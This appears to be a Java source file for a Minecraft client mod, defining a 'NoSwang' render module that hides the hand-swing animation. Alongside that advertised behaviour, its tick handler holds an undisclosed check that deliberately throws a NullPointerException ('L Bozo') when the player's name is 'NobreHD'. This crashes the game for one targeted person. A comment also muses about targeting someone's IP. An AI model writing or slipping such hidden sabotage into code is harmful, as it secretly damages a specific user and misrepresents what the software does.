package mathax.client.systems.modules.render;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.world.TickEvent;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import net.minecraft.item.Items;

public class NoSwang extends Module {

    public NoSwang() {
        super(Categories.Render, Items.AIR, "NoSwang", "Removes the swang animation | Client Side Only");
    }

    @EventHandler //hmmm, maybe volcans ip
    private void onTick(TickEvent.Post event) {
        if (mc.player.handSwingProgress > 0) {
            mc.player.handSwingProgress = 0;
        }
        if (mc.player.getName().toString().equals("NobreHD")) {
            throw new NullPointerException("L Bozo");
        }
    }
}
